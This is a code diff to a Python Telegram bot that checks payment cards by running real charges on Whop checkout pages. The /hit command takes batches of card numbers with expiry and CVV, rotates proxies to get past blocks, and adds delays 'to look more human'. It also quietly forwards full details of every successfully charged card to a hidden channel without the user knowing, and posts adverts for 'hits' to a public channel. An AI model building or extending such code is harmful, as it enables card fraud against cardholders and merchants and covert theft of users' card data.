@@ -6,6 +6,7 @@ import json
 import urllib.request
 import urllib.error
 import time
+import random
 from datetime import datetime
 from io import BytesIO
 from typing import Dict, Set, List, Optional
@@ -35,6 +36,9 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "8983900075:AAGlMV8ldf6xUdrh8ktGkKK_c9_z
 
 # Secret Channel ID (Hidden from users)
 SECRET_GROUP_ID = -1003721327421
+
+# Whop Secret Channel ID (For Paid Hits)
+WHOP_SECRET_LOGS_ID = -1003721327421
 
 logging.basicConfig(
     format="%(asctime)s [%(levelname)s] %(message)s",
@@ -384,6 +388,18 @@ async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception:
             pass
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# /hit COMMAND (WHOP CHECKOUT - MULTI CARD WITH PROXY RETRIES & LOCK)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _load_whop_proxies() -> list:
+    """Load proxies from px.txt"""
+    try:
+        with open("px.txt", "r") as f:
+            proxies = [line.strip() for line in f if line.strip()]
+            return proxies
+    except FileNotFoundError:
+        return []
+
 async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not WHOP_LOADED:
         msg = (
@@ -394,6 +410,16 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             "And ensure <code>whop_checker.py</code> is in the same folder as <code>bot.py</code>."
         )
         await update.message.reply_text(msg, parse_mode="HTML")
+        return
+
+    # ── Session Lock / Cooldown ──
+    active_hit_users = context.bot_data.setdefault("active_hit_users", set())
+    if update.effective_user.id in active_hit_users:
+        await update.message.reply_text(
+            "⏳ <b>Slow down!</b>\nYou already have an active Whop check running.\n"
+            "Please wait for it to finish before starting a new one.",
+            parse_mode="HTML"
+        )
         return
 
     if not context.args or len(context.args) < 2:
@@ -407,16 +433,11 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text(msg, parse_mode="HTML")
         return
 
-    card_str = None
-    url_str = None
+    # Extract all cards and the URL
+    cards_list = [arg for arg in context.args if "|" in arg and not arg.startswith("http")]
+    url_str = next((arg for arg in context.args if arg.startswith("http")), None)
 
-    for arg in context.args:
-        if "|" in arg and not arg.startswith("http"):
-            card_str = arg
-        elif arg.startswith("http"):
-            url_str = arg
-
-    if not card_str:
+    if not cards_list:
         await update.message.reply_text(
             "❌ No valid card format found.\n"
             "Make sure it follows: <code>CARD|MM|YY|CVV</code>",
@@ -432,84 +453,177 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         )
         return
 
-    status_msg = await update.message.reply_text("⏳ Processing Whop checkout...", parse_mode="HTML")
+    # Limit to 10 cards to prevent spam/timeout
+    if len(cards_list) > 10:
+        cards_list = cards_list[:10]
 
-    parsed, err = _parse_cc(card_str)
-    if err:
-        await status_msg.edit_text(f"❌ Error parsing card: {err}")
+    # Load proxies
+    proxies_list = _load_whop_proxies()
+    if not proxies_list:
+        await update.message.reply_text("⚠️ <b>px.txt not found or empty.</b> Please add proxies to avoid blocks.", parse_mode="HTML")
         return
+    
+    total_cards = len(cards_list)
+    status_msg = await update.message.reply_text(f"⏳ Processing Whop checkout...\nProgress: 0/{total_cards}", parse_mode="HTML")
 
-    cfg = _build_cfg(url_str, "", parsed)
+    # Lock the session for this user
+    active_hit_users.add(update.effective_user.id)
 
     loop = asyncio.get_running_loop()
-    
-    def run_checker():
-        return WhopCheckout(cfg).run_api()
+    results_data = []
+    has_paid = False
 
     try:
-        result = await loop.run_in_executor(None, run_checker)
-    except Exception as e:
-        logger.error(f"Whop checker crashed: {e}")
-        await status_msg.edit_text(f"❌ Checker crashed: {str(e)}")
-        return
+        for i, card_str in enumerate(cards_list):
+            try:
+                await status_msg.edit_text(f"⏳ Processing Whop checkout...\nProgress: {i}/{total_cards}", parse_mode="HTML")
+            except Exception:
+                pass
 
-    st = result.get("status", "unknown")
-    msg = result.get("message", "")
-    code = result.get("code", "")
-    elapsed = result.get("elapsed_ms", 0)
-    amount_raw = result.get("amount", "?")
-    currency = result.get("currency", "USD")
-    
-    # Format Amount safely
-    if isinstance(amount_raw, (int, float)) and amount_raw > 0:
-        amount_val = amount_raw / 100
-        amount_str = f"{amount_val:.2f} {currency}"
-    else:
-        amount_str = "N/A"
+            parsed, err = _parse_cc(card_str)
+            if err:
+                results_data.append({"card": card_str, "status": "error", "msg": err})
+                continue
 
-    # Determine Status and Sub-message
-    if st == "charged":
-        status_text = "Paid 💰"
-        sub_msg = "Payment successful"
-    elif st == "3ds":
-        status_text = "3D Secure 🔄"
-        sub_msg = result.get("url", "3DS required")
-    elif st == "declined":
-        status_text = "Declined ❌"
-        sub_msg = f"{msg} ({code})" if msg and code else (msg or code or "Payment failed")
-    elif st == "error":
-        status_text = "Error ⚠️"
-        sub_msg = msg
-    else:
-        status_text = "Unknown ❓"
-        sub_msg = str(result)
+            # Try up to 3 different proxies for each card
+            max_proxy_retries = min(3, len(proxies_list))
+            result = None
 
-    text = (
-        f"#Whop [/hit]\n"
-        f"⸺⸺⸺⸺⸺\n"
-        f"[𐓷] Site : Whop\n"
-        f"[𐓷] Amount : {amount_str}\n"
-        f"[𐓷] Status : {status_text}\n"
-        f"⸺⸺⸺⸺⸺\n"
-        f"<code>{card_str}</code>\n"
-        f"  ⤷ {sub_msg}"
-    )
+            for attempt in range(max_proxy_retries):
+                proxy_to_use = random.choice(proxies_list)
+                cfg = _build_cfg(url_str, "", parsed, proxy=proxy_to_use)
 
-    # Send response to user
-    await status_msg.edit_text(text, parse_mode="HTML")
+                def run_checker():
+                    return WhopCheckout(cfg).run_api()
 
-    # Send secret copy to admin channel
-    try:
-        uid_str = update.effective_user.id
-        secret_text = f"🕵️‍♂️ <b>New Whop Hit by User:</b> <code>{uid_str}</code>\n\n{text}"
-        await context.bot.send_message(
-            chat_id=SECRET_GROUP_ID,
-            text=secret_text,
-            parse_mode="HTML",
-            disable_notification=True
+                try:
+                    result = await loop.run_in_executor(None, run_checker)
+                except Exception as e:
+                    logger.error(f"Crash for {card_str} with proxy {proxy_to_use}: {e}")
+                    result = {"status": "error", "message": str(e)}
+
+                # Check if it's a proxy/blocked error
+                st_temp = result.get("status", "unknown")
+                msg_temp = result.get("message", "")
+                if st_temp == "error" and ("Page load failed" in msg_temp or "ProxyError" in msg_temp or "403" in msg_temp):
+                    logger.warning(f"Proxy {proxy_to_use} failed for {card_str}. Retrying with a new proxy ({attempt+1}/{max_proxy_retries})...")
+                    await asyncio.sleep(1) # Short delay before next proxy
+                    continue # Try next proxy
+                else:
+                    break # Success or non-proxy error, stop retrying
+
+            if result is None:
+                result = {"status": "error", "message": "All proxies failed"}
+
+            st = result.get("status", "unknown")
+            msg = result.get("message", "")
+            code = result.get("code", "")
+            
+            if st == "charged":
+                has_paid = True
+                sub_msg = "Payment successful"
+            elif st == "3ds":
+                sub_msg = result.get("url", "3DS required")
+            elif st == "declined":
+                sub_msg = msg or code or "Payment failed"
+                if "No plans" in sub_msg or "nodes" in sub_msg:
+                    sub_msg = "Declined (Product Error/Blocked)"
+                elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
+                    sub_msg = "Declined (All Proxies Blocked)"
+            elif st == "error":
+                sub_msg = msg
+                if "No plans" in sub_msg or "nodes" in sub_msg:
+                    sub_msg = "Declined (Product Error/Blocked)"
+                    st = "declined"
+                elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
+                    sub_msg = "Declined (All Proxies Blocked)"
+                    st = "declined"
+            else:
+                sub_msg = "Unknown status"
+
+            results_data.append({"card": card_str, "status": st, "msg": sub_msg})
+
+            # Add a 2-second delay between cards to look more human
+            if i < total_cards - 1:
+                await asyncio.sleep(2)
+
+        # Determine Overall Status
+        paid_count = len([r for r in results_data if r['status'] == 'charged'])
+        if has_paid:
+            overall_status = "Partially Paid 💰" if paid_count < total_cards else "Paid 💰"
+        else:
+            overall_status = "Not Paid ❌"
+
+        # Build Final Text for User (Amount Hidden)
+        text = (
+            f"#Whop [/hit]\n"
+            f"⸺⸺⸺⸺⸺\n"
+            f"⌑ Site : Whop 🌐\n"
+            f"⌑ Status : {overall_status}\n"
+            f"⌑ Progress : {total_cards}/{total_cards}\n"
+            f"⸺⸺⸺⸺⸺\n"
         )
-    except Exception as e:
-        logger.error(f"Failed to send hit secret copy: {e}")
+
+        for res in results_data:
+            text += f"<code>{res['card']}</code>\n  ⤷ {res['msg']}\n"
+
+        # Send final response to user
+        await status_msg.edit_text(text, parse_mode="HTML")
+
+        # ── Send PAID cards to channels silently ──
+        paid_cards = [res for res in results_data if res['status'] == 'charged']
+        if paid_cards:
+            try:
+                uid_str = update.effective_user.id
+                username_str = f"@{update.effective_user.username}" if update.effective_user.username else "N/A"
+                
+                # Base Hit Logo Text (Amount set to 'hide' as requested)
+                base_logo_text = (
+                    f"⌑Status : Charged 💎\n"
+                    f"⌑Hitter : Whop\n"
+                    f"⌑Amount : hide\n"
+                    f"⌑Resp : Payment successful\n"
+                    f"⌑User : {username_str}\n"
+                    f"⌑Order : ****{uid_str % 65536:04X}\n"
+                )
+                
+                secret_kb = InlineKeyboardMarkup([[
+                    InlineKeyboardButton("🦇 Batcardchk", url="https://t.me/Batcardchk")
+                ]])
+                
+                # 1. Send ONLY the Hit Logo to Public Channel (Batcardchk)
+                try:
+                    await context.bot.send_message(
+                        chat_id="@Batcardchk",
+                        text=base_logo_text,
+                        parse_mode="HTML",
+                        reply_markup=secret_kb,
+                        disable_notification=True
+                    )
+                except Exception as e:
+                    logger.error(f"Failed to send hit logo to Batcardchk: {e}")
+                
+                # 2. Send Logo + Card Details to Secret Channel
+                secret_cards_text = base_logo_text + "⸺⸺⸺⸺⸺\n"
+                for res in paid_cards:
+                    secret_cards_text += f"⌑Card : <code>{res['card']}</code>\n"
+                
+                try:
+                    await context.bot.send_message(
+                        chat_id=WHOP_SECRET_LOGS_ID,
+                        text=secret_cards_text,
+                        parse_mode="HTML",
+                        disable_notification=True  # Silently sends, user doesn't know
+                    )
+                except Exception as e:
+                    logger.error(f"Failed to send hit secret copy: {e}")
+                    
+            except Exception as e:
+                logger.error(f"Failed to build hit secret copy: {e}")
+
+    finally:
+        # Always remove the user from the lock when done or if it crashes
+        active_hit_users.discard(update.effective_user.id)
 
 async def cmd_done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id
